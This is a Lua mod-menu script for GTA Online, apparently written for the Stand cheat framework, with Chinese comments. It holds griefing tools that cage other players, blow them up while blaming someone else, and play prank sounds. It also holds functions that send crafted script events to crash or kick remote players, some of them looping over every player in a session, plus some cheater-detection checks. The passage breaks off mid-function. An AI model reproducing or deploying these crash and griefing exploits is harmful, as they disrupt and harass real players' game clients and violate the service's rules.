	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - 1, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
	cages[#cages + 1] = cage_object

	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90

	ENTITY.FREEZE_ENTITY_POSITION(cage_object, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object2, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object3, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object4, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object5, true)
	util.yield(15)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--钱笼子
function zdlz(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("bkr_prop_moneypack_03a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z, true, true, false) -- right

	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z + .25, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z + .25, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z + .25, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z + .25, true, true, false) -- right

	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield(15)
	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90
	ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--垃圾箱
function yylz(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 684586828
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, false)
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + 1, true, true, false)
	cages[#cages + 1] = cage_object
	util.yield(15)
	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90
	ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--小车车
function cclz(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local hash = 4022605402
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do		
        util.yield()
    end
    local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
    cages[#cages + 1] = cage_object
    util.yield(15)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--圣诞快乐
function sdkl1(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 238789712
	STREAMING.REQUEST_MODEL(hash)
	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
	cages[#cages + 1] = cage_object
	util.yield(15)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--圣诞快乐pro
function sdkl2(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("ch_prop_tree_02a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield(15)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--圣诞快乐promax
function sdkl3(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("ch_prop_tree_03a")
	STREAMING.REQUEST_MODEL(hash)
	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield()
	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
		rot.y = 90
		ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--电击笼
function powercage(pid)
    local number_of_cages = 6
    local elec_box = util.joaat("prop_elecbox_12")
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    pos.z -= 0.5
    request_model(elec_box)
    local temp_v3 = v3.new(0, 0, 0)
    for i = 1, number_of_cages do
        local angle = (i / number_of_cages) * 360
        temp_v3.z = angle
        local obj_pos = temp_v3:toDir()
        obj_pos:mul(2.5)
        obj_pos:add(pos)
        for offs_z = 1, 5 do
            local electric_cage = entities.create_object(elec_box, obj_pos)
            spawned_objects[#spawned_objects + 1] = electric_cage
            ENTITY.SET_ENTITY_ROTATION(electric_cage, 90.0, 0.0, angle, 2, 0)
            obj_pos.z += 0.75
            ENTITY.FREEZE_ENTITY_POSITION(electric_cage, true)
        end
    end
end
--竞技管
function jjglz()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    STREAMING.REQUEST_MODEL(2081936690)
    while not STREAMING.HAS_MODEL_LOADED(2081936690) do		
        util.yield()
    end
    local cage_object = OBJECT.CREATE_OBJECT(2081936690, pos.x, pos.y, pos.z, true, true, false)
    cages[#cages + 1] = cage_object
    util.yield(15)
    local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
    rot.y = 90
    ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end

--伊丽莎白女王的棺材盒
function gueencage(pid)
    local number_of_cages = 6
    local coffin_hash = util.joaat("prop_coffin_02b")
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    request_model(coffin_hash)
    local temp_v3 = v3.new(0, 0, 0)
    for i = 1, number_of_cages do
        local angle = (i / number_of_cages) * 360
        temp_v3.z = angle
        local obj_pos = temp_v3:toDir()
        obj_pos:mul(0.8)
        obj_pos:add(pos)
        obj_pos.z += 0.1
       local coffin = entities.create_object(coffin_hash, obj_pos)
       spawned_objects[#spawned_objects + 1] = coffin
       ENTITY.SET_ENTITY_ROTATION(coffin, 90.0, 0.0, angle,  2, 0)
       ENTITY.FREEZE_ENTITY_POSITION(coffin, true)
    end
end
--运输集装箱
function chestcage(pid)
    local container_hash = util.joaat("prop_container_ld_pu")
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    request_model(container_hash)
    pos.z -= 1
    local container = entities.create_object(container_hash, pos, 0)
    spawned_objects[#spawned_objects + 1] = container
    ENTITY.FREEZE_ENTITY_POSITION(container, true)
end
--载具笼子
function vehcagelol(pid)
    local container_hash = util.joaat("boxville3")
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    request_model(container_hash)
    local container = entities.create_vehicle(container_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 2.0, 0.0), ENTITY.GET_ENTITY_HEADING(ped))
    spawned_objects[#spawned_objects + 1] = container
    ENTITY.SET_ENTITY_VISIBLE(container, false)
    ENTITY.FREEZE_ENTITY_POSITION(container, true)
end
--燃气笼
function gascage(pid)
    local gas_cage_hash = util.joaat("prop_gascage01")
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    request_model(gas_cage_hash)
    pos.z -= 1
    local gas_cage = entities.create_object(gas_cage_hash, pos, 0)
    pos.z += 1
    local gas_cage2 = entities.create_object(gas_cage_hash, pos, 0)
    spawned_objects[#spawned_objects + 1] = gas_cage
    spawned_objects[#spawned_objects + 1] = gas_cage2
    ENTITY.FREEZE_ENTITY_POSITION(gas_cage, true)
    ENTITY.FREEZE_ENTITY_POSITION(gas_cage2, true)
end
------------------------------------
-------------声音恶搞---------------
------------------------------------	
function laughsound(pid)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local voice = "A_F_M_EASTSA_01_LATINO_FULL_01"
    local speech = "FEMALE_DISTANT_LAUGH"
    local z_off = 0
    if PED.IS_PED_IN_ANY_VEHICLE(target_ped, false) then 
        z_off = get_model_size(ENTITY.GET_ENTITY_MODEL(PED.GET_VEHICLE_PED_IS_IN(target_ped, false))).z
    end
    local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(target_ped, 0.0, -1.0, 0.0 + z_off)
    request_model_load(util.joaat("s_f_m_shop_high"))
    local voice_ped = entities.create_ped(28, util.joaat("s_f_m_shop_high"), coords, 0)
    ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(voice_ped, true, false)
    ENTITY.SET_ENTITY_VISIBLE(voice_ped, false, 0)
    ENTITY.FREEZE_ENTITY_POSITION(voice_ped, true)
    ENTITY.SET_ENTITY_INVINCIBLE(voice_ped, true)
    AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(voice_ped, speech, voice, "SPEECH_PARAMS_FORCE", 0)
    util.yield(1500)
    entities.delete_by_handle(voice_ped)
end

function stcnm(pid)
    AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "SPAWN", PLAYER.GET_PLAYER_PED(pid), "BARRY_01_SOUNDSET", true, 2)
    AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "External_Explosion", PLAYER.GET_PLAYER_PED(pid), "Methamphetamine_Job_Sounds", true, 1)
end

function phonesoundcnm(pid)
    AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Menu_Accept", PLAYER.GET_PLAYER_PED(pid), "Phone_SoundSet_Default", true, 2)
end

------------------------------------
-------------作弊者检测-------------
------------------------------------
local interior_stuff = {0, 233985, 169473, 169729, 169985, 170241, 177665, 177409, 185089, 184833, 184577, 163585, 167425, 167169}

function get_transition_state(pid)
    return memory.read_int(memory.script_global(((2689235 + 1) + (pid * 453)) + 230))
end
function get_interior_player_is_in(pid)
    return memory.read_int(memory.script_global(((2689235 + 1) + (pid * 453)) + 243)) 
end

local unreleased_vehicles = {
    "Sentinel4",
}

local modded_vehicles = {
    "dune2",
    "tractor",
    "dilettante2",
    "asea2",
    "cutter",
    "mesa2",
    "jet",
    "skylift",
    "policeold1",
    "policeold2",
    "armytrailer2",
    "towtruck",
    "towtruck2",
    "cargoplane",
}

local modded_weapons = {
    "weapon_railgun",
    "weapon_stungun",
    "weapon_digiscanner",
}
--玩家无敌检测
function god_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        for i, interior in ipairs(interior_stuff) do
            if (players.is_godmode(pid) or not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(ped)) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(pid) == 99 and get_interior_player_is_in(pid) == interior then
                util.draw_debug_text(players.get_name(pid) .. "是无敌,很有可能是作弊者")
                break
            end
        end
    end 
end
--车辆无敌检测
function cargod_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            for i, interior in ipairs(interior_stuff) do
                if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(player_veh) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(pid) == 99 and get_interior_player_is_in(pid) == interior then
                    util.draw_debug_text(players.get_name(pid) .. "载具处于无敌模式")
                    break
                end
            end
        end
    end 
end
--未发布载具检测
function unreleased_car_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(pid)
        for i, name in ipairs(unreleased_vehicles) do
            if modelHash == util.joaat(name) then
                util.draw_debug_text(players.get_name(pid) .. "正在驾驶未发布的车辆")
            end
        end
    end
end
--无法获得武器检测
function cantgetweapon_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        for i, hash in ipairs(modded_weapons) do
            local weapon_hash = util.joaat(hash)
            if WEAPON.HAS_PED_GOT_WEAPON(ped, weapon_hash, false) and WEAPON.IS_PED_ARMED(ped, 7) then
                util.draw_debug_text(players.get_name(pid) .. "正在使用无法获得武器")
                break
            end
        end
    end
end
--无法获得载具检测
function cantgetvar_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(pid)
        for i, name in ipairs(modded_vehicles) do
            if modelHash == util.joaat(name) then
                util.draw_debug_text(players.get_name(pid) .. " 正在驾驶无法获得的载具,很有可能是作弊者")
                break
            end
        end
    end
end
--室内使用武器检测
function usingweapon_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        if players.is_in_interior(pid) and WEAPON.IS_PED_ARMED(player, 7) then
            util.draw_debug_text(players.get_name(pid) .. " 正在室内使用武器,极大可能是作弊者")
            break
        end
    end
end
--超级驾驶检测
function supercar_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_speed = (ENTITY.GET_ENTITY_SPEED(vehicle)* 2.236936)
        local class = VEHICLE.GET_VEHICLE_CLASS(vehicle)
        if class ~= 15 and class ~= 16 and veh_speed >= 180 and VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1) and (players.get_vehicle_model(pid) ~= util.joaat("oppressor") or players.get_vehicle_model(pid) ~= util.joaat("oppressor2")) then
            util.toast(players.get_name(pid) .. " 正在使用超级驾驶")
            break
        end
    end
end
--超级跑检测
function superrun_detection()
    for _, pid in ipairs(players.list(true, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local ped_speed = (ENTITY.GET_ENTITY_SPEED(ped)* 2.236936)
        if not util.is_session_transition_active() and get_interior_player_is_in(pid) == 0 and get_transition_state(pid) ~= 0 
        and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_IN_ANY_VEHICLE(ped, false)
        and not TASK.IS_PED_STILL(ped) and not PED.IS_PED_JUMPING(ped) and not ENTITY.IS_ENTITY_IN_AIR(ped) and not PED.IS_PED_CLIMBING(ped) and not PED.IS_PED_VAULTING(ped)
        and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) <= 300.0 and ped_speed > 25 then -- fastest run speed is about 18ish mph but using 25 to give it some headroom to prevent false positives
            util.toast(players.get_name(pid) .. " 是超级跑")
            break
        end
    end
end
--观看检测
function lookingyou_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        for i, interior in ipairs(interior_stuff) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            if not util.is_session_transition_active() and get_transition_state(pid) ~= 0 and get_interior_player_is_in(pid) == interior
            and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped) then
                if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_cam_pos(pid)) < 15.0 and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) > 20.0 then
                    util.toast(players.get_name(pid) .. " 正在观看你")
                    break
                end
            end
        end
    end
end
--传送检测
function tp_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        if not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped) then
            local oldpos = players.get_position(pid)
            util.yield(1000)
            local currentpos = players.get_position(pid)
            for i, interior in ipairs(interior_stuff) do
                if v3.distance(oldpos, currentpos) > 500 and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z 
                and get_transition_state(pid) ~= 0 and get_interior_player_is_in(pid) == interior and PLAYER.IS_PLAYER_PLAYING(pid) and players.exists(pid) then
                    util.toast(players.get_name(pid) .. " 刚刚进行了传送")
                end
            end
        end
    end
end

function roundDecimals(float, decimals)
    decimals = 10 ^ decimals
    return math.floor(float * decimals) / decimals
end


markedPlayers = {}
otrBlipColour = 58
chatSpamSettings = {
    enabled = false,
    ignoreTeam = true,
    identicalMessages = 5,
}
--天基炮检测
function orbdection()
    local playerList = players.list(false, true, true)
    for i = 1, #playerList do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerList[i])
        if TASK.GET_IS_TASK_ACTIVE(ped, 135) and ENTITY.GET_ENTITY_SPEED(ped) == 0 then
            local pos = NETWORK.NETWORK_GET_LAST_PLAYER_POS_RECEIVED_OVER_NETWORK(playerList[i])
            for j = 1, #orbitalTableCords do
                if roundDecimals(pos.x, 1) == roundDecimals(orbitalTableCords[j].x, 1) and roundDecimals(pos.y, 1) == roundDecimals(orbitalTableCords[j].y, 1) and roundDecimals(pos.z, 1) == roundDecimals(orbitalTableCords[j].z, 1) then
                    util.toast(players.get_name(playerList[i]) ..' '.. '正在使用天基炮')
                end
            end
        end
    end
end

karma = {}
whitelistGroups = {user = true, friends = true, strangers  = true}
whitelistListTable = {}
whitelistedName = false


function getNonWhitelistedPlayers(whitelistListTable, whitelistGroups, whitelistedName)
    playerList = players.list(whitelistGroups.user, whitelistGroups.friends, whitelistGroups.strangers)
    notWhitelisted = {}
    for i = 1, #playerList do
        if not whitelistListTable[playerList[i]] and not (players.get_name(playerList[i]) == whitelistedName) then
            notWhitelisted[#notWhitelisted + 1] = playerList[i]
        end
    end
    return notWhitelisted
end

function isAnyPlayerTargetingEntity(playerPed)
    local playerList = getNonWhitelistedPlayers(whitelistListTable, whitelistGroups, whitelistedName)
    for k, playerPid in pairs(playerList) do
        if PLAYER.IS_PLAYER_TARGETTING_ENTITY(playerPid, playerPed) or PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY(playerPid, playerPed) then
            karma[playerPed] = {
                pid = playerPid,
                ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerPid)
            }
            return true
        end
    end
    karma[playerPed] = nil
    return false
end

function playerIsTargetingEntity(playerPed)
    local playerList = getNonWhitelistedPlayers(whitelistListTable, whitelistGroups, whitelistedName)
    for k, playerPid in pairs(playerList) do
        if PLAYER.IS_PLAYER_TARGETTING_ENTITY(playerPid, playerPed) or PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY(playerPid, playerPed) then
            karma[playerPed] = {
                pid = playerPid,
                ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerPid)
            }
            return true
        end
    end
    karma[playerPed] = nil
    return false
end

function sendscriptcrash()
    local userPed = players.user_ped()
    if playerIsTargetingEntity(userPed) and karma[userPed] then
        local karmaPid = karma[userPed].pid
util.trigger_script_event(1 << karmaPid, { -555356783, karmaPid ,85952,99999,52682274855,526822745 })
util.trigger_script_event(1 << karmaPid, { 526822748, karmaPid ,78552,99999 ,7949161,789454312})
util.trigger_script_event(1 << karmaPid, { -66669983, karmaPid ,526822748,555555, math.random(80521,2959749521) })
util.trigger_script_event(1 << karmaPid, { -1733737974, karmaPid ,789522 ,59486,48512151,-9545440,5845131,848153,math.random(1,2959749),189958})
util.trigger_script_event(1 << karmaPid, { -1529596656, karmaPid ,795221,59486,48512151,-9545440 , math.random(1,2959749) })
util.trigger_script_event(1 << karmaPid, { -8965204809, karmaPid ,795221,59486,48512151,-9545440 })
    end
end

function sendgobreach()
    local userPed = players.user_ped()
    if playerIsTargetingEntity(userPed) and karma[userPed] then
        local karmaPid = karma[userPed].pid
        util.trigger_script_event(1 << karmaPid, {1214823473 ,1, 0, 0, 4,0,karmaPid, karmaPid})
    end
end

function baibaiPlayer(ped, loop, expSettings)
    local TTPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TTPos = ENTITY.GET_ENTITY_COORDS(TTPed, true)
            local spped = PLAYER.PLAYER_PED_ID()
            local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(spped, true)
            SelfPlayerPos.x = SelfPlayerPos.x + 10
            TTPos.x = TTPos.x + 10
            local carc = CreateObject(util.joaat("apa_prop_flag_china"), TTPos, ENTITY.GET_ENTITY_HEADING(spped), true)
            local carcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
            local pedc = CreatePed(26, util.joaat("A_C_HEN"), TTPos, 0)
            local pedcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
            local ropec = PHYSICS.ADD_ROPE(TTPos.x, TTPos.y, TTPos.z, 0, 0, 0, 1, 1, 0.00300000000000000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, 0)
            PHYSICS.ATTACH_ENTITIES_TO_ROPE(ropec,carc,pedc,carcPos.x, carcPos.y, carcPos.z ,pedcPos.x, pedcPos.y, pedcPos.z,2, false, false, 0, 0, "Center","Center")
            util.yield(3500)
            PHYSICS.DELETE_CHILD_ROPE(ropec)
            entities.delete_by_handle(pedc)
end

function sendallplayercrash()
    local userPed = players.user_ped()
    if playerIsTargetingEntity(userPed) and karma[userPed] then
        baibaiPlayer(karma[userPed].ped, true, expSettings)
    end
end

function explosion(pos, expSettings)
    if expSettings.currentFx then
        if expSettings.currentFx.exp then
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, expSettings.currentFx.exp, 10, expSettings.audible, true, 0, expSettings.noDamage)
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 1, 10, false, true, expSettings.camShake, expSettings.noDamage)
        else
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 1, 10, false, true, expSettings.camShake, expSettings.noDamage)
        end
        if not expSettings.invisible then
            addFx(pos, expSettings.currentFx, expSettings.colour)
        end
    else
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, expSettings.expType, 10, expSettings.audible, expSettings.invisible, expSettings.camShake, expSettings.noDamage)
    end
end

JS_tbls = {}
    do
        JS_tbls.alphaPoints = {0, 87, 159, 207, 255}
    end
    

    expLoopDelay = new.delay(250, 0, 0)
    JS_tbls.effects = {
        ['Clown Explosion'] = {
            asset  	= 'scr_rcbarry2',
            name	= 'scr_exp_clown',
            colour 	= false,
            exp     = 31,
        },
        ['Clown Appears'] = {
            asset	= 'scr_rcbarry2',
            name 	= 'scr_clown_appears',
            colour  = false,
            exp     = 71,
        },
        ['FW Trailburst'] = {
            asset 	= 'scr_rcpaparazzo1',
            name 	= 'scr_mich4_firework_trailburst_spawn',
            colour 	= true,
            exp     = 66,
        },
        ['FW Starburst'] = {
            asset	= 'scr_indep_fireworks',
            name	= 'scr_indep_firework_starburst',
            colour 	= true,
        },
        ['FW Fountain'] = {
            asset 	= 'scr_indep_fireworks',
            name	= 'scr_indep_firework_fountain',
            colour 	= true,
        },
        ['Alien Disintegration'] = {
            asset	= 'scr_rcbarry1',
            name 	= 'scr_alien_disintegrate',
            colour 	= false,
            exp     = 3,
        },
        ['Clown Flowers'] = {
            asset	= 'scr_rcbarry2',
            name	= 'scr_clown_bul',
            colour 	= false,
        },
        ['FW Ground Burst'] = {
            asset 	= 'proj_indep_firework',
            name	= 'scr_indep_firework_grd_burst',
            colour 	= false,
            exp     = 25,
        }
    }

local expSettings = {
    camShake = 0, invisible = false, audible = true, noDamage = false, owned = false, blamed = false, blamedPlayer = false, expType = 0,
    --stuff for fx explosions
    currentFx = JS_tbls.effects['Clown_Explosion'],
    colour = new.colour( 255, 0, 255 )
}

function explodePlayer(ped, loop, expSettings)
    pos = ENTITY.GET_ENTITY_COORDS(ped)
   --if any blame is enabled this decides who should be blamed
    blamedPlayer = PLAYER.PLAYER_PED_ID()
   if expSettings.blamedPlayer and expSettings.blamed then
       blamedPlayer = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(expSettings.blamedPlayer)
   elseif expSettings.blamed then
        playerList = players.list(true, true, true)
       blamedPlayer = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerList[math.random(1, #playerList)])
   end
   if not loop and PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
       for i = 0, 50, 1 do --50 explosions to account for most armored vehicles
           if expSettings.owned or expSettings.blamed then
               ownedExplosion(blamedPlayer, pos, expSettings)
           else
               explosion(pos, expSettings)
           end
           util.yield(10)
       end
   elseif expSettings.owned or expSettings.blamed then
       ownedExplosion(blamedPlayer, pos, expSettings)
   else
       explosion(pos, expSettings)
   end
   util.yield(10)
end

function getTotalDelay(delayTable)
    return (delayTable.ms + (delayTable.s * 1000) + (delayTable.min * 1000 * 60))
end

function bulletaimkarma()
    local userPed = players.user_ped()
    if isAnyPlayerTargetingEntity(userPed) and karma[userPed] then
        local pos = ENTITY.GET_ENTITY_COORDS(karma[userPed].ped)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z, pos.x, pos.y, pos.z + 0.1, 100, true, 100416529, userPed, true, false, 100.0)
        util.yield(getTotalDelay(expLoopDelay))
    end
end

function expaimkarma()
    local userPed = players.user_ped()
    if isAnyPlayerTargetingEntity(userPed) and karma[userPed] then
        explodePlayer(karma[userPed].ped, true, expSettings)
    end
end

function godaimkarma()
    local userPed = players.user_ped()
    if isAnyPlayerTargetingEntity(userPed) and karma[userPed] and players.is_godmode(karma[userPed].pid) then
        local karmaPid = karma[userPed].pid
        util.trigger_script_event(1 << karmaPid, {-1388926377, karmaPid, -1762807505, math.random(0, 9999)})
    end
end

function sendscriptevent_one()
    for pid = 0, 32 do
        if pid ~= players.user() and players.exists(pid) then
            util.trigger_script_event(1 << pid, {-93722397 ,1, 0, 0, 4,0,PLAYER.GET_PLAYER_INDEX(), pid})
        end
    end
end

function sendscriptevent_two()
    for pid = 0, 31 do
        if pid ~= players.user() and players.exists(pid) then
            util.trigger_script_event(1 << pid, {-93722397, 1, 0, 0, 1, 1,PLAYER.GET_PLAYER_INDEX(), pid})
        end
    end
end
function sendscriptevent_three()
    for pid = 0, 31 do
        if pid ~= players.user() and players.exists(pid) then
            util.trigger_script_event(1 << pid, {-168599209, -1, 1, 1, 0, 1, 0,PLAYER.GET_PLAYER_INDEX(), pid})
        end
    end
end
function sendscripptevent_five()
    for pid = 0, 31 do
        if pid ~= players.user() and players.exists(pid) then
